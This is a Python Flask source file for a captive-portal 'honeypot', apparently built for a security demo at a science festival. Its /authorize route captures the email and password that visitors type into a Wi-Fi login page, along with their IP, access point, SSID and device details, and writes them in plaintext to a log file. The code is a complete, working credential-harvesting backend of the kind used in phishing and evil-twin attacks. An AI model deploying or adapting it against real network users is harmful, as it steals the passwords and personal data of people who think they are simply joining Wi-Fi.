from flask import Flask, request, redirect
import json
import time
from datetime import datetime, timezone

app = Flask(__name__)

LOG_FILE = "honeypot.log"


# user agent parsing
def parse_user_agent(ua):
    device = "unknown"
    os = "unknown"
    browser = "unknown"

    if "Windows" in ua:
        os = "Windows"
    elif "Mac OS" in ua or "Macintosh" in ua:
        os = "MacOS"
    elif "Linux" in ua:
        os = "Linux"
    elif "Android" in ua:
        os = "Android"
    elif "iPhone" in ua or "iPad" in ua:
        os = "iOS"

    if any(x in ua for x in ["Mobile", "Android", "iPhone"]):
        device = "mobile"
    else:
        device = "desktop"

    if "Edg" in ua:
        browser = "Edge"
    elif "Firefox" in ua:
        browser = "Firefox"
    elif "Chrome" in ua:
        browser = "Chrome"
    elif "Safari" in ua:
        browser = "Safari"

    return device, os, browser


# structured logging
def log(data):

    network = data.get("network") or {}
    credentials = data.get("credentials") or {}
    device = data.get("device") or {}

    ip = data.get("ip") or network.get("ip")
    ap = data.get("ap") or network.get("ap")
    ssid = data.get("ssid") or network.get("ssid")

    email = data.get("email") or credentials.get("email")
    password = data.get("password") or credentials.get("password")

    user_agent = (
        data.get("userAgent")
        or data.get("user_agent")
        or device.get("user_agent")
        or device.get("userAgent")
    )

    device_type = data.get("device") or device.get("type")
    os_name = data.get("os") or device.get("os")
    browser_name = data.get("browser") or device.get("browser")

    enriched = {
        "version": 1,
        "event": data.get("event", "login"),
        "timestamp": {
            "utc": datetime.now(timezone.utc).isoformat()
        },
        "session": {
            "duration_sec": data.get("session_duration_sec", 0)
        },
        "network": {
            "ip": ip,
            "ap": ap or None,
            "ssid": ssid or None
        },
        "credentials": {
            "email": email,
            "password": password,
            "provided": bool(email or password)
        },
        "device": {
            "user_agent": user_agent,
            "type": device_type,
            "os": os_name,
            "browser": browser_name
        },
        "meta": {
            "source": "captive-portal",
            "lab_mode": True,
            "controller": None,
            "festival": "Robot & Science Festival Odense"
        }
    }

    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(enriched, indent=2) + "\n\n")


# authorize route
@app.route("/authorize")
def authorize():

    ip = request.remote_addr

    ap = request.args.get("ap")
    ssid = request.args.get("ssid")
    start_time = request.args.get("startTime")

    email = request.args.get("email", "")
    password = request.args.get("password", "")

    user_agent = request.headers.get("User-Agent", "")

    # session time
    try:
        session_duration = int((time.time() * 1000 - int(start_time)) / 1000)
    except:
        session_duration = 0

    # UA parse
    device, os, browser = parse_user_agent(user_agent)

    # raw event
    log_entry = {
        "event": "login",
        "session_duration_sec": session_duration,

        "network": {
            "ip": ip,
            "ap": ap,
            "ssid": ssid
        },

        "credentials": {
            "email": email,
            "password": password
        },

        "device": {
            "user_agent": user_agent,
            "type": device,
            "os": os,
            "browser": browser
        }
    }

    print(json.dumps(log_entry, indent=2))
    log(log_entry)

    return redirect("/success.html")


# RUN
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)